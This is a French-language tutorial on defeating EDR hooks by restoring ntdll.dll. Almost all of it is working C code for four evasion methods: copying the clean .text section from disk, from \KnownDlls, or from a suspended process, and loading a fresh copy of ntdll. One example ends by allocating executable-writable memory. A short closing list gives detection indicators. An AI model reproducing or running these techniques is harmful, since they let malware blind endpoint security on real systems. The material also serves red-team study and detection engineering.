# NTDLL Unhooking - Supprimer les hooks EDR

## Introduction

Au lieu de contourner les hooks avec des syscalls directs, on peut **supprimer les hooks** en restaurant la version originale de ntdll.dll.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    AVANT UNHOOKING                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   ntdll.dll (en mémoire)                                           │
│   ┌─────────────────────────────────────────────────────┐           │
│   │  NtAllocateVirtualMemory:                           │           │
│   │      JMP EDR_Hook    ◄── Hook EDR !                 │           │
│   │      ...                                             │           │
│   └─────────────────────────────────────────────────────┘           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│                    APRÈS UNHOOKING                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   ntdll.dll (en mémoire)                                           │
│   ┌─────────────────────────────────────────────────────┐           │
│   │  NtAllocateVirtualMemory:                           │           │
│   │      mov r10, rcx    ◄── Code original restauré !   │           │
│   │      mov eax, 18h                                    │           │
│   │      syscall                                         │           │
│   │      ret                                             │           │
│   └─────────────────────────────────────────────────────┘           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Méthodes d'obtention d'une copie clean

### Méthode 1 : Lire depuis le disque

```c
#include <windows.h>
#include <stdio.h>

/**
 * UnhookNtdll_FromDisk - Restaure ntdll depuis le fichier sur disque
 */
BOOL UnhookNtdll_FromDisk() {

    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hMapping = NULL;
    LPVOID pMapping = NULL;
    BOOL bSuccess = FALSE;

    // ===== ÉTAPE 1 : Lire ntdll.dll depuis le disque =====
    printf("[*] Lecture de ntdll.dll depuis le disque...\n");

    hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Impossible d'ouvrir ntdll.dll\n");
        return FALSE;
    }

    // Mapper le fichier en mémoire
    hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        printf("[-] CreateFileMapping échoué\n");
        goto cleanup;
    }

    pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        printf("[-] MapViewOfFile échoué\n");
        goto cleanup;
    }

    printf("[+] ntdll.dll mappée depuis le disque à : 0x%p\n", pMapping);

    // ===== ÉTAPE 2 : Récupérer ntdll en mémoire (hookée) =====
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] ntdll.dll non trouvée en mémoire\n");
        goto cleanup;
    }

    printf("[+] ntdll.dll en mémoire à : 0x%p\n", hNtdll);

    // ===== ÉTAPE 3 : Trouver la section .text =====
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    PVOID pTextSection = NULL;
    DWORD dwTextSize = 0;
    DWORD dwTextRVA = 0;

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            pTextSection = (PVOID)((BYTE*)pMapping + pSection[i].VirtualAddress);
            dwTextSize = pSection[i].Misc.VirtualSize;
            dwTextRVA = pSection[i].VirtualAddress;
            break;
        }
    }

    if (!pTextSection) {
        printf("[-] Section .text non trouvée\n");
        goto cleanup;
    }

    printf("[+] Section .text trouvée : RVA=0x%X, Taille=0x%X\n", dwTextRVA, dwTextSize);

    // ===== ÉTAPE 4 : Changer les protections mémoire =====
    PVOID pTargetText = (PVOID)((BYTE*)hNtdll + dwTextRVA);
    DWORD dwOldProtect;

    if (!VirtualProtect(pTargetText, dwTextSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
        printf("[-] VirtualProtect échoué : %d\n", GetLastError());
        goto cleanup;
    }

    // ===== ÉTAPE 5 : Écraser la section .text hookée =====
    printf("[*] Restauration de la section .text...\n");

    memcpy(pTargetText, pTextSection, dwTextSize);

    // Restaurer les protections
    VirtualProtect(pTargetText, dwTextSize, dwOldProtect, &dwOldProtect);

    printf("[+] ntdll.dll unhookée avec succès !\n");
    bSuccess = TRUE;

cleanup:
    if (pMapping) UnmapViewOfFile(pMapping);
    if (hMapping) CloseHandle(hMapping);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

    return bSuccess;
}
```

---

### Méthode 2 : Depuis KnownDlls

`\KnownDlls\ntdll.dll` est une copie cachée par le système.

```c
#include <windows.h>
#include <stdio.h>

// Pour NtOpenSection
typedef NTSTATUS (NTAPI* pNtOpenSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

/**
 * UnhookNtdll_KnownDlls - Restaure depuis \KnownDlls\ntdll.dll
 */
BOOL UnhookNtdll_KnownDlls() {

    HANDLE hSection = NULL;
    PVOID pMapping = NULL;
    BOOL bSuccess = FALSE;

    // Résoudre NtOpenSection (on utilise la version hookée, ironiquement)
    pNtOpenSection NtOpenSection = (pNtOpenSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenSection");

    // Préparer le nom de l'objet
    UNICODE_STRING usSectionName;
    usSectionName.Buffer = L"\\KnownDlls\\ntdll.dll";
    usSectionName.Length = wcslen(usSectionName.Buffer) * sizeof(WCHAR);
    usSectionName.MaximumLength = usSectionName.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &usSectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Ouvrir la section
    NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);
    if (status != 0) {
        printf("[-] NtOpenSection échoué : 0x%X\n", status);
        return FALSE;
    }

    printf("[+] Section KnownDlls ouverte\n");

    // Mapper la section
    pMapping = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        printf("[-] MapViewOfFile échoué\n");
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] ntdll.dll depuis KnownDlls mappée à : 0x%p\n", pMapping);

    // ... (même logique que méthode 1 pour copier .text)

    UnmapViewOfFile(pMapping);
    CloseHandle(hSection);

    return bSuccess;
}
```

---

### Méthode 3 : Depuis un processus suspendu

Créer un nouveau processus = ntdll pas encore hookée !

```c
#include <windows.h>
#include <stdio.h>

/**
 * UnhookNtdll_SuspendedProcess - Copie ntdll depuis un processus vierge
 */
BOOL UnhookNtdll_SuspendedProcess() {

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    BOOL bSuccess = FALSE;

    // ===== ÉTAPE 1 : Créer un processus suspendu =====
    printf("[*] Création d'un processus suspendu...\n");

    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,  // Le processus ne démarre pas = EDR pas encore hookée
        NULL, NULL, &si, &pi
    )) {
        printf("[-] CreateProcess échoué\n");
        return FALSE;
    }

    printf("[+] Processus créé, PID : %d\n", pi.dwProcessId);

    // ===== ÉTAPE 2 : Trouver ntdll dans le processus distant =====
    // On utilise NtQueryInformationProcess pour obtenir le PEB
    // Puis on parse les modules chargés

    // Récupérer notre ntdll hookée
    HMODULE hLocalNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hLocalNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hLocalNtdll + pDos->e_lfanew);

    // Trouver .text
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    PVOID pLocalText = NULL;
    DWORD dwTextSize = 0;
    DWORD dwTextRVA = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            dwTextRVA = pSection[i].VirtualAddress;
            dwTextSize = pSection[i].Misc.VirtualSize;
            pLocalText = (PVOID)((BYTE*)hLocalNtdll + dwTextRVA);
            break;
        }
    }

    // ===== ÉTAPE 3 : Lire .text depuis le processus distant =====
    // Dans le processus suspendu, ntdll est à la même adresse (ASLR par boot)
    PVOID pCleanText = VirtualAlloc(NULL, dwTextSize, MEM_COMMIT, PAGE_READWRITE);

    SIZE_T bytesRead;
    if (!ReadProcessMemory(
        pi.hProcess,
        (PVOID)((BYTE*)hLocalNtdll + dwTextRVA),  // Même adresse
        pCleanText,
        dwTextSize,
        &bytesRead
    )) {
        printf("[-] ReadProcessMemory échoué\n");
        goto cleanup;
    }

    printf("[+] Section .text lue depuis le processus suspendu (%zu bytes)\n", bytesRead);

    // ===== ÉTAPE 4 : Écraser notre .text hookée =====
    DWORD dwOldProtect;
    VirtualProtect(pLocalText, dwTextSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtect);
    memcpy(pLocalText, pCleanText, dwTextSize);
    VirtualProtect(pLocalText, dwTextSize, dwOldProtect, &dwOldProtect);

    printf("[+] ntdll.dll unhookée !\n");
    bSuccess = TRUE;

cleanup:
    // Terminer le processus suspendu
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (pCleanText) VirtualFree(pCleanText, 0, MEM_RELEASE);

    return bSuccess;
}
```

---

### Méthode 4 : Perun's Fart (ntdll.dll fraîche)

Charger une **deuxième copie** de ntdll avec un nom différent.

```c
#include <windows.h>
#include <stdio.h>

/**
 * LoadFreshNtdll - Charge une copie non hookée de ntdll
 */
HMODULE LoadFreshNtdll() {

    char szTempPath[MAX_PATH];
    char szTempFile[MAX_PATH];

    // Copier ntdll.dll vers un fichier temporaire
    GetTempPathA(MAX_PATH, szTempPath);
    GetTempFileNameA(szTempPath, "ntd", 0, szTempFile);

    // Supprimer l'extension .tmp et ajouter .dll
    strcpy(strrchr(szTempFile, '.'), ".dll");

    printf("[*] Copie de ntdll.dll vers : %s\n", szTempFile);

    if (!CopyFileA("C:\\Windows\\System32\\ntdll.dll", szTempFile, FALSE)) {
        printf("[-] CopyFile échoué\n");
        return NULL;
    }

    // Charger cette nouvelle copie
    HMODULE hFreshNtdll = LoadLibraryA(szTempFile);

    if (hFreshNtdll) {
        printf("[+] ntdll fraîche chargée à : 0x%p\n", hFreshNtdll);

        // Maintenant on peut utiliser GetProcAddress sur hFreshNtdll
        // pour obtenir des fonctions non hookées !
    }

    // Supprimer le fichier (optionnel, on peut le garder mappé)
    // DeleteFileA(szTempFile);

    return hFreshNtdll;
}

// Utilisation
int main() {
    HMODULE hCleanNtdll = LoadFreshNtdll();

    if (hCleanNtdll) {
        // Utiliser les fonctions de la copie clean
        typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(
            HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

        pNtAllocateVirtualMemory NtAllocateVirtualMemory =
            (pNtAllocateVirtualMemory)GetProcAddress(hCleanNtdll, "NtAllocateVirtualMemory");

        // Cette fonction n'est PAS hookée !
        PVOID pMem = NULL;
        SIZE_T size = 4096;
        NtAllocateVirtualMemory(GetCurrentProcess(), &pMem, 0, &size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        printf("[+] Mémoire allouée via ntdll clean : 0x%p\n", pMem);
    }

    return 0;
}
```

---

## Comparaison des méthodes

| Méthode | Avantages | Inconvénients |
|---------|-----------|---------------|
| Depuis disque | Simple, fiable | Accès fichier = IOC potentiel |
| KnownDlls | Pas d'accès disque | Nécessite NtOpenSection |
| Processus suspendu | Très furtif | Plus complexe, crée un processus |
| Perun's Fart | Garde les 2 versions | Fichier temporaire, LoadLibrary loggé |

---

## Détection

```
Indicateurs pour les défenseurs :

1. Modification de ntdll.dll en mémoire
   → Monitoring des modifications de sections exécutables

2. Lecture de ntdll.dll depuis le disque
   → Surveiller les accès à C:\Windows\System32\ntdll.dll

3. Accès à \KnownDlls\ntdll.dll
   → Peu commun pour une application normale

4. Création de processus immédiatement terminés
   → Pattern suspect de la méthode "suspended process"

5. Chargement de DLL depuis %TEMP%
   → Surveiller LoadLibrary depuis répertoires temporaires
```

---

## Références

- [Full DLL Unhooking - ired.team](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)
- [EDR Unhooking - Medium](https://bobvanderstaak.medium.com/unhooking-edr-by-remapping-ntdll-dll-101a99887dfe)
- [Perun's Fart](https://blog.sektor7.net/)
